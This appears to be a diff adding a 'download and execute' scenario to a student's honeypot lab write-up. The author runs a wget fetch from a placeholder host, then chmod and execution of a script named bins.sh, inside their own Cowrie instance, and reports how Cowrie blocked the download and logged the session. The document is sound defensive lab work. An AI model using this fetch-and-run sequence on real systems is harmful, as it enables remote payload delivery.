@@ -55,3 +55,27 @@ I typed `uname -a` first to see the system and the fake machine answered with a 
 The time I noted before starting was `2026-10-30T23:13:44Z` in true UTC and the time I noted after it ended was `2026-10-30T23:17:11Z`. The Cowrie log window is
 
 ---
+
+## Scenario 5: download and execute
+
+I came back to my attacker VM Kali and started a small web server there that held a harmless script called `bins.sh`. I bound it to the host-only address only so it could never be reached from the Bridged side. In another tab I opened another shell and logged in by hand to my own honeypot with the lab account. My plan was to get the file onto my victim machine like an attacker would so I typed `wget` to fetch it but it failed and the error said `name resolution failed`. I was a little shocked that something broke and then I shifted my mood to investigation.
+
+Command: `python3 -m http.server 8000 --bind <kali-ip>`
+
+Command: `wget http://<kali-ip>:8000/bins.sh`
+
+The web server window showed nothing so I knew the request never arrived. I made a plain request from Debian to the same server outside Cowrie and it worked and returned `37 bytes` so the network and the server were fine and the problem was inside Cowrie. I searched the code of Cowrie and found that the error text is written by its own wget command. Before it connects it checks the address and blocks every address that is not a public internet address. My lab address is private so it blocked mine. The `name resolution failed` line was a fake one shown by the Cowrie script because no lookup happened at all. I think this is a safety feature but that is my guess because I did not read the reason from the developers. I thought about changing Cowrie so the download would work but I did not do that because it would alter my real research and I am stating this honestly here.
+
+My first try is session `94e82f308aaf` and it has only the `wget` and then `exit` so it is incomplete. The web server was on and saw nothing. It stays in the log as proof and it is not part of this scenario. For the record I tried again and typed `wget` then `chmod +x bins.sh` to make it executable and at last `./bins.sh` to run it like an attacker would. The web server was off for this second try and it is the scenario.
+
+Command: `chmod +x bins.sh`
+
+Command: `./bins.sh`
+
+The time I noted before the second try was `2026-10-30T23:56:44Z` in true UTC and the time I noted after it ended was `2026-10-30T23:58:59Z`. The Cowrie log window is `2026-10-31T04:56:44 to 2026-10-31T04:58:59` with the same `5 hour shift` as before because of the timezone of my Debian VM.
+
+Then I came to Cowrie and found one session in that window and the session ID was `4482296f8cb3`. It shows one successful login at `04:57:07` and `no failed logins`. After that it shows `4 commands` in this order: `wget`, `chmod +x bins.sh`, `./bins.sh` and `exit`. It shows one failed command event for `./bins.sh` and `no download event` at all so no file was captured. The session closed at `04:58:33` so it lasted about `93 seconds`. My activity was logged in Cowrie even though the download was blocked.
+
+Now if I try to map this to `MITRE ATT&CK` the number would be `T1105 (Ingress Tool Transfer)`. It failed because of the Cowrie rule but it was an attempt (`Label: SIMULATED.`)
+
+---
